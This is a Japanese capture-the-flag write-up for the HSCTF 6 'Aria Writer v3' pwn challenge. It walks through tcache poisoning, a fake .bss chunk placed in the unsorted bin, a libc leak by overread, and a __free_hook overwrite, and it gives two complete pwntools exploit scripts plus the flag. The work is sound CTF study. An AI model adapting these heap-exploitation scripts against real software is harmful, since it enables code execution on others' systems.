---
tags: pwn
---


# HSCTF 6 - Aria Writer v3

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/hsncsclub/HSCTF-6-Problems>

## Writeup

### outline

バイナリの動きは[HSCTF 6 - Aria Writer](/9UMnoL_yTOOxuLMjx3ntDw)とだいたい同じだが諸々の制限が追加されたり解除されたりする。例によってshow機能が無いが、最初に入力した名前(グローバル変数: `name`)が毎回表示される。この付近に偽装チャンクを作ってUnsorted Binに放り込めば名前と一緒に`main_arena`に近いアドレスの値を読めそうな気がする。
最初の入力で偽装チャンク用のサイズを入力する。そしてtcache poisoningでこの付近に大きなチャンクとその次と更に次のチャンクを作り、FreeしてUnsorted Binに放り込んでfd, bkがmain_arena近辺の値を指すようにする。
あとは名前がチャンクのサイズになっており、ヌル文字を埋めないとfd, bkまで読めないのでこれをtcache poisoningで埋めてOverreadし、libc leakをする。
Full RELROなので今回は`__free_hook`を書き換えてシェルを取る。

### binary

```
$ checksec aria-writer-v3
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
前問と比べるとRELROがFullになっている。
これ以外に特筆すべき前問との違いは、まず嬉しい点としてfreeの制限が撤廃された(代わりにmallocの制限回数が実装されたが0x100回までなので制限が無いに等しい)、これで任意値書き込み放題である。
更に飛ぶだけでシェルが起動する`win`関数が実装された(どうせlibc leakを要する問題なのでそこまで嬉しくないが)。
嬉しくない点だが、Full RELROになった。これで`__free_hook`を書き換えるという方針が立った。
また、微妙な違いとして最初に入力する名前の開示機能はなくなり、毎回名前を表示するようになった。それとグローバル変数の構造が若干変わっている。これは偽装チャンクを構成する際に改めて説明する。
基本的な機能は前問と同じなのでデコンパイル結果は省略する。

### Unsorted Bin

GOT Overwriteが無理なのでそれ以外の方法でlibc leakを狙わなくてはならない。考えられるのは[Security Fest 2019 - Baby5 (Unsorted Bin Attack)](/8sk4smXMRPeHvORbrmH1Lw)同様にUnsorted Binに放り込んだチャンクを読む事である。
しかし今回はtcacheに入るサイズ以上のサイズをwrite時に指定するとプログラムが終了する。よってサイズを偽装したチャンクをなんとか作ってそこにポインタを移しfreeすることを考える。
また、UAFやDouble Freeはいくらでも出来るのだが、show機能がまともに存在していないので関与出来るメモリ上にlibcのアドレスを置くことが出来てもそれを読むことが難しい。名前だけなら読むことが出来るので名前の近くにチャンクを作ってOverreadすることを狙う。

なお、[Security Fest 2019 - Baby5 (Unsorted Bin Attack)](/8sk4smXMRPeHvORbrmH1Lw)では意識していなかったが、Unsorted Binに入るチャンクはメモリ上でその下のチャンク(と更にその下)の`PREV_INUSE`が立っているかを確認しているらしい。これに引っかかるとtopに繋がれるようだ。
よって次で偽装チャンクを生成するが、大きな偽装チャンクに加えて小さくてサイズとフラグの整合性が取れるチャンクを2つ下に用意する。

### 偽装チャンク

この問題の`.bss`セクションは次のようになっている。

```
curr: 0x602040 -> mallocしたポインタはここに入る、freeもここから
name: 0x602048 -> 最初に入力する名前
...
(途中プログラムの最初に0x1337を代入している箇所があったり、malloc回数をカウントする箇所があるがだいたい0)
```

このセクションの大きさは`0xe0`だが、プロセスが確保しているメモリは`0x603000`まであるのでここまではwritableである。嬉しい。
そういうわけでここに比較的大きいチャンクを用意しても特に文句は言われない。
さて、Unsorted Binに入るチャンクの大きさは0x420以上であった(今回は0x500にしている)。というわけで`.bss`セクションを次のような配置にすることで大きな偽装チャンク(とUnsorted Binに入れる為のチャンク)を構成する。

```
<curr>         :        | <curr + 0x8 (name)> : 0x501 # size of large chunk
<curr + 0x10>  :        |
...

<curr + 0x500> :        | <curr + 0x508> : 0x21 # size of small chunk1
...
<curr + 0x520> :        | <curr + 0x528> : 0x21 # size of small chunk2
```
これによって大まかに次のようなメモリ配置になる

```
<サイズ0x500の巨大チャンク>
<サイズ0x20のチャンク(真上のチャンクは使用中)>
<サイズ0x20のチャンク(真上のチャンクは使用中)>
```

この状態で一番上のチャンクがfreeされたとする。大きさ的にtcacheには入らないのでまずはUnsorted Binに入ろうとする。
この時にサイズから真下のチャンクを特定する。そしてそのサイズ部分にあるフラグからこの大きなチャンクが使われているチャンクかどうかを確かめる。
更にその先のチャンクも見ることで真下のチャンクも使用中かどうかを確かめる。この手順は既に使われていないチャンクを結合してtopに繋ぐかどうかに関わっているらしく、もし使用中でなければこの大きな偽装チャンクと一緒に結合されてtopに繋がれてしまうらしい。これを防いでUnsorted Binに確実に入れる為に、次の次のチャンクまで用意しておく。

なお、このようなチャンクの構成はサイズを指定してtcache poisoningをすることで簡単に出来るので詳しい手順は省く。

こうして偽装チャンクを用意出来たらここをfreeする。Double Freeで次の次にmallocされるアドレスを指定できるのでここに指定し、mallocされたらfreeすると無事にこのチャンクはUnsorted Binへ入る。

### Overread & guessing address of libc

改めて今のname周辺のメモリの様子を図示する。

```
<curr>        :                    | <curr + 0x8 (name)>: 0x501
<curr + 0x10> : &main_arena + 0x60 | <curr + 0x18>      : &main_arena + 0x60
...
```
Unsorted Binに入ったのでfd, bkメンバが`&main_arena->top`を指すようになる。
そして、ここで名前を読めば無事に`&main_arena->top`のアドレスが手に...入らない。`name`の中身が`01 05 00 00 00 00 00 00`なのでヌル文字に邪魔されて続きを読むことが出来ない。
そこでもう一度tcache poisoningでここを埋める。但し、tcacheやfastbinにチャンクが登録されていないと、再びmallocが呼ばれた際にUnsorted Binにあるチャンクを切り出すことになってしまう。
もちろんこのチャンクもUnsorted Binにあるのでmallocで切り出され、必然的に`fd`メンバは上書きされてしまう。よって`bk`を潰さない程度にwrite(malloc+edit)しなくてはならない。
また、Unsorted Binから切り出されたことで最早fd, bkが`main_arena.top`に対応するアドレスを指すことは無く、どこかのBinに格納されていることを示すようになる。
ただこれも`main_arena->bin`のどこかを指すようになるのでmain_arenaに近いアドレスを得ることが出来る。
デバッガでアタッチすれば判明するのだが、何度か試して`bk`を読むにつれておそらく`&main_arena + 0x490`を指すだろうと推測した。
これはlibcの配置箇所の下位bitは0が続いていることから推測した。
これで無事にlibc leakが出来たのでもう一度tcache poisoningをして`__free_hook`を`win`のアドレスに書き換えてシェルを取る。

## Code

```python
from pwn import process, remote, p64, u64, ELF


def _select(s, sel, c=b"Gimme int pls > "):
    s.recvuntil(c)
    s.sendline(sel)


def get_name(s):
    junk = b"! rob needs your help composing an aria "
    r = s.recvuntil(junk)
    return r[:-len(junk)]


def write(s, l, data=b"junk"):
    _select(s, b"1")
    s.recvuntil(b"Gimme int pls > ")
    s.sendline(str(l).encode())
    s.recvuntil(b"what should i write tho > ")
    s.send(data)


def delete(s):
    _select(s, b"2")
    s.recvline()


if __name__ == '__main__':
    target = "localhost"
    port = 2468
    # s = process("./aria-writer-v3")
    s = remote(target, port)

    elf = ELF("./aria-writer-v3")
    win = elf.symbols["win"]
    curr = elf.symbols["curr"]
    name_addr = curr + 8
    large_chunk = curr + 16
    libc = ELF("./libc-2.27.so")
    arena_libc = 0x3ebc40
    print(hex(name_addr))

    name = p64(0x501)
    s.sendline(name)
    s.recvline()

    # tamper size of next chunk
    print(get_name(s))
    size = 0x20
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(curr + 0x500))
    write(s, size)
    write(s, size, p64(0) + p64(0x21))

    # tamper size of next next chunk
    print(get_name(s))
    size = 0x30
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(curr + 0x500 + 0x20))
    write(s, size)
    write(s, size, p64(0) + p64(0x21))

    # free large chunk
    print(get_name(s))
    size = 0x40
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(large_chunk))  # next next chunk is curr + 0x10 (large chunk)
    write(s, size)
    write(s, size, b"free large_chunk")
    delete(s)

    # libc leak by overreading name from bk (but this value points somewhere of main_arena)
    # I guessed offset is 0x490
    size = 0x50
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(name_addr))
    write(s, size)
    write(s, size, b"junkjunkjunkjunk")

    r = get_name(s)
    print(r)

    libc_base = u64(r[0x10:].ljust(8, b"\x00")) - arena_libc - 0x490

    print(hex(libc_base))
    free_hook_addr = libc_base + libc.symbols["__free_hook"]

    # tcache poisoning
    size = 0x60
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(free_hook_addr))
    write(s, size)
    write(s, size, p64(win))

    delete(s)

    s.interactive()
```

## Flag

`hsctf{i_wish_tho_:(_0a0d098213}`

## 参考Writeup

* [ptr-yudaiさんのwriteup](https://bitbucket.org/ptr-yudai/writeups/src/master/2019/HSCTF_6/aria_writer_v3/): いつも本当にありがとうございます
* [jt00000さんのwriteup](https://github.com/jt00000/ctf.writeup/tree/abe6b0713aaa8e82b78575319b89018c00fc6ecb/hsctf6/pwn_ariav3): tcacheを余らせておけば`main_arena->top`を指したままリークできる、凄い

## Special Thanks

* 弊チームのPwn担当: 質問攻めにしてごめん

## 感想

Unsorted Bin Attackなんもわからんという感じなのと、納得は出来たが人のWriteup写経になりつつあるのでBinの知識をしっかり付ける必要があることを実感した。glibc mallocのソースコードを読めば良いのか...?

## 追記

あの後、参考Writeupの2つ目同様に事前にDouble Freeで循環させたtcacheを用意してそこからmallocし、Unsorted Binからmallocするのを防ぐ解法で解いた。
これなら偽装チャンクは再度mallocされず、`fd`が破壊されない上に`&main_arena->top`を指したままである

実は最初はこれをやろうとしていたのだが、前述したようにlibc leakの過程でUnsorted Binからmallocしてしまう問題によってオフセットがいつもの`main_arena@libc + 0x60`では無いことに頭を抱えていた。
値のダンプによって0x490が正しいオフセットであることはわかっていたものの原因究明に半日費やして良い勉強になりました

```python
from pwn import process, remote, p64, u64, ELF


def _select(s, sel, c=b"Gimme int pls > "):
    s.recvuntil(c)
    s.sendline(sel)


def get_name(s):
    junk = b"! rob needs your help composing an aria "
    r = s.recvuntil(junk)
    return r[:-len(junk)]


def write(s, l, data=b"junk"):
    _select(s, b"1")
    s.recvuntil(b"Gimme int pls > ")
    s.sendline(str(l).encode())
    s.recvuntil(b"what should i write tho > ")
    s.send(data)


def delete(s):
    _select(s, b"2")
    s.recvline()


if __name__ == '__main__':
    target = "localhost"
    port = 2468
    # s = process("./aria-writer-v3")
    s = remote(target, port)

    elf = ELF("./aria-writer-v3")
    win = elf.symbols["win"]
    curr = elf.symbols["curr"]
    name_addr = curr + 8
    large_chunk = curr + 16
    libc = ELF("./libc-2.27.so")
    arena_libc = 0x3ebc40
    print(hex(name_addr))

    chunk_size = 0x420
    name = p64(chunk_size + 1)
    s.sendline(name)
    s.recvline()

    # ready for the tcache poisoning after unsorted bin attack
    size = 0x58
    write(s, size)
    delete(s)
    delete(s)

    size = 0x78
    write(s, size)
    delete(s)
    delete(s)

    # tamper size of next chunk
    print(get_name(s))
    size = 0x28
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(curr + chunk_size))
    write(s, size)
    write(s, size, p64(0) + p64(0x21))

    # tamper size of next next chunk
    print(get_name(s))
    size = 0x38
    write(s, size)
    delete(s)
    delete(s)
    write(s, size, p64(curr + chunk_size + 0x20))
    write(s, size)
    write(s, size, p64(0) + p64(0x21))

    # free large chunk
    print(get_name(s))
    size = 0x48
    write(s, size)
    delete(s)
    delete(s)
    # next next chunk is curr + 0x10 (large chunk)
    write(s, size, p64(large_chunk))
    write(s, size)
    write(s, size, b"free large_chunk")
    delete(s)

    # libc leak by overreading name from fd
    size = 0x58
    write(s, size, p64(name_addr))
    write(s, size)
    write(s, size, b"junkjunk")

    r = get_name(s)
    print(r)

    bk = u64(r[0x8:].ljust(8, b"\x00"))
    print(hex(bk))

    libc_base = bk - arena_libc - 0x60

    print(hex(libc_base))
    free_hook_addr = libc_base + libc.symbols["__free_hook"]

    # tcache poisoning
    size = 0x78
    write(s, size, p64(free_hook_addr))
    write(s, size)
    write(s, size, p64(win))

    delete(s)

    s.interactive()

```